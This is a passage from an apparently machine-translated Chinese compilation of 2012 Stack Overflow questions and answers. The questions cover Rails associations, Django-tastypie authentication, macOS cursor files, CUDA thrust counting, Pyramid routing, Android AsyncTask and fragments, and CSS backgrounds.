        _.each(posts, function(p){
          p.user = map[p.user];
        });
        return res.send(posts);
      });
    });
   }
}); 
```

这没有经过很好的测试，您需要处理`User.find`调用中的错误情况，但这应该是一个很好的起点。

此外，`async`图书馆对这类东西有很大帮助。您可能会研究一下类似的`waterfall`方法来解决疯狂的嵌套回调问题。

# ruby-on-rails - 这个 rails 3 .build 方法到底在做什么？

> ID：11553824
> 
> 赞同：3
> 
> 时间：2012-07-19T04:10:49.980
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, ruby-on-rails-3.2

摘自著名的敏捷 Web 开发与 Rails 书（最新版）中的片段：

```
def create 

  @cart = current_cart 

  product = Product.find(params[:product_id])

  @line_item = @cart.line_items.build(product: product) 
```

这适用于一般的电子商务/仓库应用程序，此功能适用于特定产品的“添加到购物车”按钮。这是我感到困惑的地方：

我想象的代码是：

```
@line_item = line_items.build(product: product) 

@line_item = line_items.build(cart: @cart) 
```

基本上，如果 a`line_item`既属于产品又属于购物车，我会分别创建这些关系。

另外，如果购物车还`line_items`没有，那我该怎么办`@cart.line_items`？我知道`line_items.build(product: product)`将返回给我一个`line_item`对象（我保存到`@line_item`），但是如果购物车中还没有对象，如何`cart.line_items`工作`line_items`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T05:03:29.013

在`Cart`模型中，很可能`has_many`与`LineItem`名为 的模型有关联`line_items`。Rails 将自动使用空数组初始化该关联。

你可以认为`@cart`被初始化为：

```
@cart = Cart.new
@cart.line_items = [] 
```

每次添加 call`@cart.line_items.build`时，都可以这样想：

```
new_line_item = LineItem.new cart: @cart
@cart.line_items.push new_line_item 
```

注意：这绝对不是实际代码的工作方式，但您可以将功能行为视为相同。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T14:55:41.450

@cart.line_items 有时可能表现得像一个数组，但它实际上是一个包含关系信息的具有更多功能[的对象。](http://api.rubyonrails.org/classes/ActiveRecord/Associations/ClassMethods.html)因此，当您打电话时，`@cart.line_items.build`您实际上是在向（我认为）ActiveRecord::Relation 类型的对象发送消息`build`，然后该对象在您的 line_item 的内存中构建一个对象，并且已经设置了 cart_id。

# django - 获取 Django-tastypie 认证的用户详细信息

> ID：11553825
> 
> 赞同：1
> 
> 时间：2012-07-19T04:10:53.493
> 
> 标签：django

我已经实现了 django 项目，它包括了美味的应用程序。客户端可以将请求发送到 CRUD 操作。

我在访问登录的用户详细信息时遇到问题。在这里，我正在尝试实现 BasicAuthentication + TokenBased Authentication。

这是我的自定义实现

```
from tastypie.authentication import Authentication
from tastypie.authorization import Authorization

class MyAuthentication(Authentication):

    def is_authenticated(self, request, **kwargs):
        return True

    from django.contrib.sessions.models import Session
    if 'sessionid' in request.COOKIES:
        try:
            s = Session.objects.get(pk=request.COOKIES['sessionid'])
        except Exception,e:
            return False

        # get the user_id from the session
        if '_auth_user_id' in s.get_decoded():
            # try to find the user associated with the given sessionid
            try:
                u = User.objects.get(pk=s.get_decoded()['_auth_user_id'])
                if u is not None:
                    return False
            except Exception,e:
                return False
        else:
            return False
    else:
        return False

    def get_identifier(self, request):
        return request.user.username 
```

那么我的资源文件，我正在尝试访问该`MyAuthenticate`课程。

```
class InvoiceResource(ModelResource):
    user = fields.ForeignKey(UserResource, 'user')
    class Meta:
        user = User.objects.get(pk=1)
        queryset = user.invoice_set.all()
        resource_name = 'invoice'
        authorization = Authorization()
        authentication = MyAuthentication(); 
```

这就是问题出现了。我需要加载属于登录用户的所有发票。基本上我想将记录的用户 ID 作为此查询的参数传递。

```
user = User.objects.get(pk=1) 
```

任何想法？。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T18:12:30.217

有关最新版本，请参阅[实施您自己的授权](http://django-tastypie.readthedocs.org/en/latest/authorization.html)。食谱（截至 2013 年 4 月 18 日）已过时，`apply_authorization_limits`不推荐使用。

新方案是创建自定义授权并应用它。授权可以检查您想要的任何内容。在文档中，请参阅`UserObjectsOnlyAuthorization`您正在谈论的示例。

# macos - Mac 光标文件夹

> ID：11553826
> 
> 赞同：13
> 
> 时间：2012-07-19T04:10:58.837
> 
> 标签：macos

我已经研究了几个小时，我想找到我的 Mac 系统默认光标。没有任何鼠标悬停，我只想要默认光标。我正在运行旧版本的 Mac 之一，即：10.4.11；

有人告诉我光标在这里：

```
/System/Library/Frameworks/ApplicationServices.framework/Versions/A/Frameworks/HiServices.framework/Versions/A/Resources/cursors 
```

但是，似乎没有 Cursors 文件夹

```
/System/Library/Frameworks/ApplicationServices.framework/Versions/A/Frameworks/HiServices.framework/Versions/A/Resources/ 
```

请帮忙。我想要一杯冰沙。:P

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-19T04:37:02.590

当系统的其余部分可能不可用时（例如在启动时），需要显示默认箭头，因此它可能存储在特殊位置，例如硬件本身。

最接近默认光标的图像可能是“上下文菜单”，这里：

```
/System/Library/Frameworks/ApplicationServices.framework/Versions/A/Frameworks/HIServices.framework/Versions/A/Resources/cursors/contextualmenu/cursor_1only_.png 
```

通过一些小的编辑，您可能可以将此图像变成完整的箭头图片。

大多数其他游标在 WebKit 中都有图像，这里：

```
/System/Library/Frameworks/WebKit.framework/Versions/Current/Frameworks/WebCore.framework/Resources/ 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2014-07-30T18:33:40.220

在做了一些挖掘之后，我发现了这个：

```
/System/Library/PrivateFrameworks/EFILogin.framework/Versions/A/Resources/EFIResourceBuilder.bundle/Contents/Resources/loginui_cursor@2x.png 
```

希望这就是你要找的。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-06-05T20:09:50.277

您可以以编程方式提取图像：

```
//: Playground - noun: a place where people can play

import Cocoa

let cursor = NSCursor.arrowCursor().image.TIFFRepresentation

let searchPaths = NSSearchPathForDirectoriesInDomains(.DocumentDirectory, NSSearchPathDomainMask.UserDomainMask, true)

let documentsPath = searchPaths[0] as! String
let savePath = documentsPath.stringByAppendingPathComponent("cursor.tiff")

cursor?.writeToFile(savePath, atomically: true) 
```

结果是具有 4 个不同版本的光标的 tiff，范围从 20x24 像素（非视网膜默认）到 200x240 像素。使用 Preview.app，您可以抓取每个单独的尺寸并将其复制/粘贴到新文档中，并将每个尺寸保存为 png。

或者只是抓住我之前准备的一个：[https ://dl.dropboxusercontent.com/u/147461/mac-cursor/mac-cursor.zip](https://dl.dropboxusercontent.com/u/147461/mac-cursor/mac-cursor.zip)

# ruby-on-rails - 韩语正则表达式检查：如何只允许全字母（例如회원이름）并防止没有字母（例如ㅋㅋㅋ）

> ID：11553830
> 
> 赞同：2
> 
> 时间：2012-07-19T04:11:47.980
> 
> 标签：ruby-on-rails, ruby, regex

是否有 Ruby 或 Rails 方法来确保韩语用户名由完整的字母（如 회원이름）组成，而不仅仅是辅音或元音（如 ㅋㅋㅋ 或 ㅏㅏㅏ）？

如果 Ruby 或 Rails 方式不可用，您将如何编写方法来验证此条件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T04:23:30.953

我不懂韩语，但我以前写过 Ruby 代码来处理中文文本。（如果你有兴趣，我可以提供一个 GitHub 链接。）

在编写该代码时，我查看了 Unicode 标准（请参阅[http://unicode.org/charts](http://unicode.org/charts)）并发现哪些代码点范围代表汉字。我确保脚本中的所有字符串都编码为 UTF-8，然后使用：

```
str.codepoints 
```

...获取一系列 Unicode 代码点（作为整数）。然后我可以遍历那个整数序列，找到所有的汉字。

在您的情况下，如果您查找韩语字符的 Unicode 代码点，我相信您也可以这样做。我可以在 Unicode 图表中看到 Hangul Jamo、Hangul Syllables 等，但我不确定其中哪一个是您想要的。

您还应该仔细考虑您希望允许/禁止哪些其他字符 - 例如，如果您的用户将 ASCII 文本、标点符号、中文、日语、阿拉伯语等与韩文混合使用，是否可以？

# android - 在自定义 ArrayAdapter 中获取两个 TextView 的值

> ID：11553834
> 
> 赞同：-1
> 
> 时间：2012-07-19T04:12:10.447
> 
> 标签：android, android-arrayadapter

我有一个带有两个文本视图的 CustomAdapter。我需要获取每个值/字符串。

我可以通过这样做来抓住第一个：

```
List<String> dataList;
List<String> catList; 
public void onItemClick(AdapterView<?> arg0, View arg1,
                    int arg2, long id) {

firstTextView = dataList.get(arg2); // This grabs TextView #1
secondTextView = catList. ???

// later on

adapter = new SearchAdapter(SearchableActivity.this, dataList, catList);
setListAdapter(adapter); 
```

如何获得第二个值？我显然无法创建 arg3

有任何想法吗？

编辑：或者这对于 ArrayAdapter 是不可行的，我需要创建一些更自定义的东西，比如 BaseAdapter？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T04:30:57.317

使用`onItemClick`方法的第二个参数：

```
TextView first = (TextView) arg1.findViewById(R.id.first_textview);
String s1 = first.getText().toString();
TextView second = (TextView) arg1.findViewById(R.id.second_textview);
String s2 = second.getText().toString(); 
```

也许最好只从您的适配器返回一个包含两个字符串的特殊对象，例如：

```
class DataStructure {
    String s1, s2
} 
```

并从此适配器返回它。

# datetime - 计算中的不同时间格式？

> ID：11553835
> 
> 赞同：2
> 
> 时间：2012-07-19T04:12:16.933
> 
> 标签：datetime, time

我正在组合一个函数，我可以轻松地在计算中找到的标准时间格式之间进行转换。

以下是我的一些想法：

*   Unix 时间（自 1970 年 1 月 1 日午夜以来的秒数）
*   JavaScript 中的 Unix 时间（自 1970 年 1 月 1 日午夜以来的毫秒数）
*   MySQL 日期时间 (YYYY-MM-DD HH:MM:SS)

还有哪些其他标准格式？网上有这个清单吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T06:10:03.477

Common Lisp 纪元，即从 1900-01-01 00:00:00 UTC 开始的秒数。此外，纯整数也很常见：例如`2012-07-10 -> 20120710U`二进制编码的十进制数（至少在 64 位系统上）`2012-07-12 -> 0x0200010200070102ULL`：.

后一种解决方案的优势显然是您可以很容易地在打印和内部表示之间来回切换，并且关系 ( `<`, `>`, `==`) 也可以工作。您也可以说类似`2012-06-00`或`2012-00-01`（分别省略月份或月份）。

缺点是当你想增加 1 天时，你需要更多的魔法。另一方面，可以以有意义的方式定义 add-1-month ，这是您无法用 epoch 表示做的事情。

**编辑**
想出了更多：

*   如果您正在进行与日历无关的计算，您可能会求助于朱利安日期 2451545 大约是 2000-01-01 12:00:00 UTC
*   Matlab 在预公历中使用自 0000-01-01 以来的小数天数

深入研究单个软件特定日期表示的列表，您可能会写满整本书。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T03:42:11.873

[http://en.m.wikipedia.org/wiki/ISO_8601](http://en.m.wikipedia.org/wiki/ISO_8601) - ISO 日期格式。

但是，大多数语言已经有这些东西的标准实用程序......你确定你没有不必要地这样做吗？

# .net - 如何在 wpf 中实现用户会话？

> ID：11553837
> 
> 赞同：1
> 
> 时间：2012-07-19T04:12:45.077
> 
> 标签：.net, wpf, vb.net, wpftoolkit

如何在 wpf 中实现用户会话？

我有一个 XBAP 应用程序，我需要在其中实现用户会话 有什么方法可以在 WPF 中实现这一点吗？

谢谢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T05:13:54.383

WPF 没有实现会话的概念。

您可以使用会话提供程序或 asp Web 服务来生成自定义解决方案。

或者，您可以为所有用户数据使用[隔离存储。](http://msdn.microsoft.com/en-us/library/d8saf4wy.aspx)

还可以查看一些以前的帖子，这些帖子解决了这个问题：

*   [WPF 桌面中的简单用户会话示例](https://stackoverflow.com/questions/5993834/examples-of-simple-user-sessions-in-wpf-desktop)
*   [可以在 Windows 应用程序中使用 asp.net 成员资格提供程序吗？](https://stackoverflow.com/questions/444230/can-you-use-the-asp-net-membership-provider-in-a-windows-application)

# cuda - 推力计数发生

> ID：11553839
> 
> 赞同：1
> 
> 时间：2012-07-19T04:12:57.207
> 
> 标签：cuda, thrust

> **可能重复：**
> [计算 cuda 数组中数字的出现次数](https://stackoverflow.com/questions/7573900/counting-occurences-of-numbers-in-cuda-array)

有没有办法使用推力或 cuda 来计算数组中重复项的出现次数？

例如，如果我有一个设备向量 { 11, 11, 9, 1, 3, 11, 1, 2, 9, 1, 11} 我应该得到 1 :3 2:1 3:1 9:2, 11:4

如果推力不能做到这一点，我该如何使用内核来做到这一点？

谢谢！我正在做浓度计算。这就是我问这个问题的原因。假设在具有 nx X ny X nz 细胞的域中有 100000 个粒子，我需要计算每个细胞的浓度（每个细胞中有多少粒子）

我的内核是这个

```
__global__ void concentration_kernel(float3* posPtr, uint* device_cons) 
{
    __shared__ uint cache[256];
    uint x = threadIdx.x + blockIdx.x * blockDim.x;
    uint y = threadIdx.y + blockIdx.y * blockDim.y;
    uint offset = x + y * blockDim.x * gridDim.x; 

    float3 posf3 = posPtr[offset];//make_float3(43.5,55,0.66);//
    uint cellIndex = (uint)(posf3.z+1)*153*110 + (uint)(posf3.y)*153 + (uint)posf3.x;

    cache[threadIdx.x] = device_cons[cellIndex];
    __syncthreads();
    uint a = cache[threadIdx.x];
    a++;
    cache[threadIdx.x] = a;
    __syncthreads();

    device_cons[cellIndex] = cache[threadIdx.x]; 
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T04:29:02.440

您可以先使用[推力::sort](http://docs.thrust.googlecode.com/hg/group__sorting.html#ga01621fff7b6eb24fb68944cc2f10af6a)对向量进行排序，然后使用[推力::reduce_by_key](http://docs.thrust.googlecode.com/hg/group__reductions.html#ga1fd25c0e5e4cc0a6ab0dcb1f7f13a2ad)。但是，您还需要在排序后创建一个 1 的新向量（称为值）（并且与排序后的向量长度相同）。这些值将相加以获得计数：

```
reduce_by_key is a generalization of reduce to key-value pairs. 
For each group of consecutive keys in the range [keys_first, keys_last) 
that are equal, reduce_by_key copies the first element of the group to 
the keys_output. The corresponding values in the range are reduced using 
the plus and the result copied to values_output. 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T14:16:01.853

您可以使用`thrust::unique`和的组合`thrust::binary_search`来查找重复项。您将无法使用这种方法就地完成它，但可以仅使用推力代码来完成。

# python - 未呈现的页面上的金字塔错误

> ID：11553840
> 
> 赞同：2
> 
> 时间：2012-07-19T04:13:03.720
> 
> 标签：python, pyramid

我遇到了一个非常奇怪的错误。不知何故，无论我在哪个页面上，它都会加载我想要的页面然后尝试加载另一个页面（但是由于我不打算转到该页面，因此它寻找的变量不存在，所以它给了我控制台中的错误）

这是我的路线：

```
config.add_route('editdata', '/{userurl}/{dataname}/edit')
config.add_route('viewdata', '/{userurl}/{dataname}')
config.add_route('profile', '/{userurl}') 
```

如果我转到editdata页面，页面加载正常，但在我的调试屏幕中，我收到与配置文件页面相关的错误（我知道我在那个部分，因为我放置了打印语句输出我所在的功能并且错误是与该页面中的 sql 相关，与编辑页面无关）。

我更改了路由的顺序，但仍然出现错误，我在某些函数中使用了一些名为 profile 的变量，所以我什至尝试将路由名称更改为 profile1，但仍然出现错误。当我注释掉配置文件路径（在 init 和视图中）时，错误就消失了，但显然我的配置文件区域无法访问。

关于我可以尝试解决此问题的任何建议？除了在路线中，我没有看到对我的个人资料视图的任何引用（没有页面重定向到个人资料，但在 jinja2 的每个页面上，我都有指向个人资料的链接，但我也有指向其他页面的链接，但没有得到错误）。

如果它有帮助，那就是回溯（我所做的只是转到 viewdata 页面，根本没有转到个人资料页面）。：

```
C:\Users\lostsoul\Desktop>C:\Users\lostsoul\GoogleDrive\pyramidtut\Scripts\pserve.
exe C:\Users\lostsoul\GoogleDrive\pyramidtut\tutorial\development.ini --reload
Starting subprocess with file monitor
Starting server in PID 4016.
serving on http://0.0.0.0:6543
we are viewing the data
****
Variables are:
monkey
dog
*****
we are in profile section
2012-07-19 00:07:01,388 ERROR [pyramid_debugtoolbar][Dummy-2] Exception at http:
//localhost:6543/favicon.ico
traceback url: http://localhost:6543/_debug_toolbar/exception?token=c0660cf901de
bc8c3af7&tb=67564912
Traceback (most recent call last):
  File "C:\Users\lostsoul\GoogleDrive\pyramidtut\lib\site-packages\pyramid_debugt
oolbar-1.0.2-py2.7.egg\pyramid_debugtoolbar\toolbar.py", line 122, in toolbar_tw
een
    response = _handler(request)
  File "C:\Users\lostsoul\GoogleDrive\pyramidtut\lib\site-packages\pyramid_debugt
oolbar-1.0.2-py2.7.egg\pyramid_debugtoolbar\panels\performance.py", line 69, in
noresource_timer_handler
    result = handler(request)
  File "C:\Users\lostsoul\GoogleDrive\pyramidtut\lib\site-packages\pyramid-1.3.2-
py2.7.egg\pyramid\tweens.py", line 20, in excview_tween
    response = handler(request)
  File "C:\Users\lostsoul\GoogleDrive\pyramidtut\lib\site-packages\pyramid_tm-0.5
-py2.7.egg\pyramid_tm\__init__.py", line 100, in tm_tween
    response = handler(request)
  File "C:\Users\lostsoul\GoogleDrive\pyramidtut\lib\site-packages\pyramid-1.3.2-
py2.7.egg\pyramid\router.py", line 164, in handle_request
    response = view_callable(context, request)
  File "C:\Users\lostsoul\GoogleDrive\pyramidtut\lib\site-packages\pyramid-1.3.2-
py2.7.egg\pyramid\config\views.py", line 333, in rendered_view
    result = view(context, request)
  File "C:\Users\lostsoul\GoogleDrive\pyramidtut\lib\site-packages\pyramid-1.3.2-
py2.7.egg\pyramid\config\views.py", line 471, in _requestonly_view
    response = view(request)
  File "c:\users\lostsoul\googledrive\pyramidtut\tutorial\tutorial\views.py", lin
e 109, in profile
    profile_info = DBSession.query(data).filter(data.owner==profileda
ta.id).all()
AttributeError: 'NoneType' object has no attribute 'id' 
```

你可以看到（靠近顶部）它成功地呈现了 viewdata 视图（输出变量并告诉我我在哪里）但是由于某种原因它也加载了配置文件页面。我对它为什么这样做以及加载它的请求来自哪里感到困惑。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-19T15:24:52.580

如果您查看粘贴顶部附近，您可以看到生成错误的 URL 是`'/favicon.ico'`浏览器在您访问您的站点时请求的 URL。该路径与您的个人资料 url 的正则表达式**匹配**`'/{userurl}'`。

# php - AsyncTask 发送 HTML 请求失败

> ID：11553843
> 
> 赞同：0
> 
> 时间：2012-07-19T04:13:16.563
> 
> 标签：php, android, webserver, android-asynctask, server-side

我正在尝试使用 AsyncTask 类向后端服务器 php 文件发送 HTML 请求，但是，发送操作无法完成，logcat 中出现一些错误消息，我可以寻求一些解决问题的建议吗？

下面是我的 AsyncTask 类：

```
private class GrabURL extends AsyncTask<String, Void, Void>{

    ArrayList<NameValuePair> nameValuePairs;

    //private ProgressDialog Dialog;

    public GrabURL() { 
        nameValuePairs = new ArrayList<NameValuePair>(); 
        //Dialog = new ProgressDialog(Reader.this); 
    } 

    protected void onPreExecute(String key, String value) {
        mTest.append("PreExecute");
        //Dialog.setMessage("Sending value..");
        //Dialog.show();
        nameValuePairs.add(new BasicNameValuePair(key,value));
        }

    @Override
    protected Void doInBackground(String... urls) {
        // TODO Auto-generated method stub
        try{
            mTest.append("doinback");
            HttpClient client = new DefaultHttpClient();
            HttpPost post = new HttpPost(urls[0]);
            UrlEncodedFormEntity ent = new UrlEncodedFormEntity(nameValuePairs,HTTP.UTF_8);
            post.setEntity(ent);
            client.execute(post); 
         } catch (Exception e) {
             e.printStackTrace();
         }
        return null;
    }

    protected void onPostExecute(Void unused) {
        mTest.append("PostExecute");
        //Dialog.dismiss();
        Toast.makeText(getApplicationContext(), "Value updated", Toast.LENGTH_SHORT).show();
    }
} 
```

我通过在外部类中调用它来启动发送操作

```
grab.execute(new String[]{"http://192.168.1.150/myapp/check.php"}); 
```

如果我隐藏与对话框相关的那些内容，则不会显示任何错误消息，但是，它仍然无法与服务器通信。

如果我不隐藏它们，这里是错误消息

```
07-19 15:11:29.360: E/WindowManager(26555): Activity android.reader.Reader has leaked window com.android.internal.policy.impl.PhoneWindow$DecorView@416dddc8 that was originally added here
07-19 15:11:29.360: E/WindowManager(26555): android.view.WindowLeaked: Activity android.reader.Reader has leaked window com.android.internal.policy.impl.PhoneWindow$DecorView@416dddc8 that was originally added here
07-19 15:11:29.360: E/WindowManager(26555):     at android.view.ViewRootImpl.<init>(ViewRootImpl.java:344)
07-19 15:11:29.360: E/WindowManager(26555):     at android.view.WindowManagerImpl.addView(WindowManagerImpl.java:267)
07-19 15:11:29.360: E/WindowManager(26555):     at android.view.WindowManagerImpl.addView(WindowManagerImpl.java:215)
07-19 15:11:29.360: E/WindowManager(26555):     at android.view.WindowManagerImpl$CompatModeWrapper.addView(WindowManagerImpl.java:140)
07-19 15:11:29.360: E/WindowManager(26555):     at android.view.Window$LocalWindowManager.addView(Window.java:537)
07-19 15:11:29.360: E/WindowManager(26555):     at android.app.Dialog.show(Dialog.java:278)
07-19 15:11:29.360: E/WindowManager(26555):     at android.reader.Reader$GrabURL.onPreExecute(Reader.java:228)
07-19 15:11:29.360: E/WindowManager(26555):     at android.reader.Reader$1.onClick(Reader.java:102)
07-19 15:11:29.360: E/WindowManager(26555):     at android.view.View.performClick(View.java:3511)
07-19 15:11:29.360: E/WindowManager(26555):     at android.view.View$PerformClick.run(View.java:14105)
07-19 15:11:29.360: E/WindowManager(26555):     at android.os.Handler.handleCallback(Handler.java:605)
07-19 15:11:29.360: E/WindowManager(26555):     at android.os.Handler.dispatchMessage(Handler.java:92)
07-19 15:11:29.360: E/WindowManager(26555):     at android.os.Looper.loop(Looper.java:137)
07-19 15:11:29.360: E/WindowManager(26555):     at android.app.ActivityThread.main(ActivityThread.java:4424)
07-19 15:11:29.360: E/WindowManager(26555):     at java.lang.reflect.Method.invokeNative(Native Method)
07-19 15:11:29.360: E/WindowManager(26555):     at java.lang.reflect.Method.invoke(Method.java:511)
07-19 15:11:29.360: E/WindowManager(26555):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
07-19 15:11:29.360: E/WindowManager(26555):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
07-19 15:11:29.360: E/WindowManager(26555):     at dalvik.system.NativeStart.main(Native Method) 
```

下面是我的服务器端程序的代码，只是一个简单的 php 文件。

```
<?php
    $file = "C:/wamp/www/myapp/file.txt";
    $data = "AID:".$_POST['A']." BID:".$_POST['B'];
    file_put_contents($file, $data);
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T05:02:22.297

我已经检查了你的代码。它是您的服务器错误。我认为该职位无法正常工作。请检查它，然后将其放入 AsyncTask。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T05:16:24.493

根据日志，执行停止在`Dialog.show()`in `preExecute()`，您不知道您的逻辑是否有任何问题，`doInBackground()`永远不会执行。

尝试这个：

*   在构造函数中进行初始化
*   确保`Reader`是您正在调用的活动的名称`GrabURL`。

    ```
    private class GrabURL extends AsyncTask<String, Void, Void> {

    ArrayList<NameValuePair> nameValuePairs;
    private ProgressDialog Dialog;

    public void GrabURL() {
        nameValuePairs = new ArrayList<NameValuePair>();
        Dialog = new ProgressDialog(Reader.this);
    }

    protected void onPreExecute(String key, String value) {
        System.out.println("PreExecute");
        Dialog.setMessage("Sending value..");
        Dialog.show();
        nameValuePairs.add(new BasicNameValuePair(key, value));
    }

    @Override
    protected Void doInBackground(String... urls) {
        // TODO Auto-generated method stub
        try {
            System.out.println("doinback");
            HttpClient client = new DefaultHttpClient();
            HttpPost post = new HttpPost(urls[0]);
            UrlEncodedFormEntity ent = new UrlEncodedFormEntity(
                    nameValuePairs, HTTP.UTF_8);
            post.setEntity(ent);
            client.execute(post);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    protected void onPostExecute(Void unused) {
        System.out.println("PostExecute");
        Dialog.dismiss();
        Toast.makeText(getApplicationContext(), "Value updated",
                Toast.LENGTH_SHORT).show();
    }
    } 
    ```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-19T06:55:56.887

问题似乎是您试图`doInBackground()`通过执行`mTest.append("doinback");`似乎是 TextView 来更新 UI。因此，删除它并更好地尝试从`onPreExecute()`和更新 UI 元素`onPostExecute()`。

# css - 具有 html/css 背景的 div

> ID：11553845
> 
> 赞同：0
> 
> 时间：2012-07-19T04:13:18.727
> 
> 标签：css, html

我已经找到了一个类似的问题，但没有点击。

这是我的代码，我想要两个背景。我知道如何添加两个背景，但一个背景图像需要在一个特定的位置，通过使用 div 来完成。我的代码可能有最简单的缺陷。请注意，我是一个新手，并试图从我已经知道的少量知识再次进入 Web 开发。

```
<head>
<style type="text/css">
        body {
            <div id="currentpage">
                background-image: url(bgsource/contactpage.png);
                background-repeat: no-repeat;
            </div>
        }
        #currentpage{
            position: absolute;
            width:auto;
            height:auto;
            left:424px;
            top:134px;
            margin-left:0px;
            margin-top:0px; 
        }
</style>
<?php include_once("general.php"); ?>
</head> 
```

我可能想包括我有一个加载到每个页面的 general.php 模板，这是否也会影响背景工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T04:14:59.040

您的 html 和 css 不正确。请参阅下面的更正

```
<style type="text/css">

        #currentpage{
            position: absolute;
            width:auto;
            height:auto;
            left:424px;
            top:134px;
            margin-left:0px;
            margin-top:0px;
    background-image: url(bgsource/contactpage.png);
    background-repeat: no-repeat;
                    }
</style> 
```

和 html 这样做

```
<div id="currentpage"></div> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T04:19:19.023

像这样更改您的代码。因为您不能像您在问题中提到的那样在 css 中应用 html 标记。

```
 <head>
    <style type="text/css">
    #currentpage{
          position: absolute;
          width:auto; /* specify width */
          height:auto; /* specify height */
          left:424px;
          top:134px;
          margin-left:0px;
          margin-top:0px;
          background-image: url(bgsource/contactpage.png);
          background-repeat: no-repeat;
    }
    </style>
    </head>
    <body>
       <div id="currentpage"></div>
    </body> 
```

并指定`width`和`height`用于`div`显示图像。否则你将有一个白色的背景。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-19T04:20:13.860

```
 **change your css and html**

         <head>

           <style type="text/css">
        #currentpage{
            position: absolute;
            width:xx;
            height:xx;
            left:424px;
            top:134px;
            margin-left:0px;
            margin-top:0px; 
            background-image: url(bgsource/contactpage.png);
            background-repeat: no-repeat;
                    }
</style>

</head>
    <body>
   <div id="currentpage"></div>
    </body> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-19T04:25:54.960

是的。你不能在你的 css 页面或 css 脚本中使用 div 标签。

```
 background-image: url(bgsource/contactpage.png);
        background-repeat: no-repeat;
        position: absolute;
        width:auto;
        height:auto;
        left:424px;
        top:134px;
        margin-left:0px;
        margin-top:0px; 
```

仅在您的 css 页面或脚本标签中使用上述代码，但在 css 中不允许使用 div 标签

# android - 无法执行活动的方法。从 FragmentActivity 调用 Fragment 的方法

> ID：11553850
> 
> 赞同：0
> 
> 时间：2012-07-19T04:13:34.110
> 
> 标签：android, android-fragments, android-fragmentactivity

尝试调用片段方法时出现错误“无法执行活动的方法”。

此方法位于扩展 android.support.v4.app.FragmentActivity 的类中。您可以在最后一行看到对 NasaDailyFragment.onRefresh() 的调用。NasaDailyImage 类扩展了 android.support.v4.app.Fragment。我还尝试将 onRefreshClicked() 上的所有内容放在一个线程中，然后运行该线程，但遇到了另一个奇怪的错误，如果有帮助，我可以复制该错误。

```
 public class NasaAppActivity extends FragmentActivity {
//stuff
 public void onRefreshClicked(View view){
       Log.d("debug", "in run");
       FragmentManager fragmentManager=getSupportFragmentManager();
       NasaDailyImage NasaDailyFragment;
       NasaDailyFragment=(NasaDailyImage)fragmentManager.findFragmentById(R.id.fragment_iotd);
       Log.d("debug", "fragment has been casted");
       NasaDailyFragment.onRefresh();
}
   } 
```

这是被调用的方法

```
public class NasaDailyImage extends Fragment {
//other methods
     public void onRefresh(){
            System.out.println("in onRefresh");
            new RssParseSync(getActivity()).execute(title,description,date,link);//using a class that extends asynctask
        }
} 
```

logcat 日志

```
07-19 03:58:10.906: I/dalvikvm(629): threadid=3: reacting to signal 3
07-19 03:58:10.986: I/dalvikvm(629): Wrote stack traces to '/data/anr/traces.txt'
07-19 03:58:11.156: D/gralloc_goldfish(629): Emulator without GPU emulation detected.
07-19 03:59:06.446: D/debug(629): in run
07-19 03:59:06.446: D/debug(629): fragment has been casted
07-19 03:59:06.446: D/AndroidRuntime(629): Shutting down VM
07-19 03:59:06.446: W/dalvikvm(629): threadid=1: thread exiting with uncaught exception (group=0x409c01f8)
07-19 03:59:06.466: E/AndroidRuntime(629): FATAL EXCEPTION: main
07-19 03:59:06.466: E/AndroidRuntime(629): java.lang.IllegalStateException: Could not execute method of the activity
07-19 03:59:06.466: E/AndroidRuntime(629):  at android.view.View$1.onClick(View.java:3044)
07-19 03:59:06.466: E/AndroidRuntime(629):  at android.view.View.performClick(View.java:3511)
07-19 03:59:06.466: E/AndroidRuntime(629):  at android.view.View$PerformClick.run(View.java:14105)
07-19 03:59:06.466: E/AndroidRuntime(629):  at android.os.Handler.handleCallback(Handler.java:605)
07-19 03:59:06.466: E/AndroidRuntime(629):  at android.os.Handler.dispatchMessage(Handler.java:92)
07-19 03:59:06.466: E/AndroidRuntime(629):  at android.os.Looper.loop(Looper.java:137)
07-19 03:59:06.466: E/AndroidRuntime(629):  at android.app.ActivityThread.main(ActivityThread.java:4424)
07-19 03:59:06.466: E/AndroidRuntime(629):  at java.lang.reflect.Method.invokeNative(Native Method)
07-19 03:59:06.466: E/AndroidRuntime(629):  at java.lang.reflect.Method.invoke(Method.java:511)
07-19 03:59:06.466: E/AndroidRuntime(629):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
07-19 03:59:06.466: E/AndroidRuntime(629):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
07-19 03:59:06.466: E/AndroidRuntime(629):  at dalvik.system.NativeStart.main(Native Method)
07-19 03:59:06.466: E/AndroidRuntime(629): Caused by: java.lang.reflect.InvocationTargetException
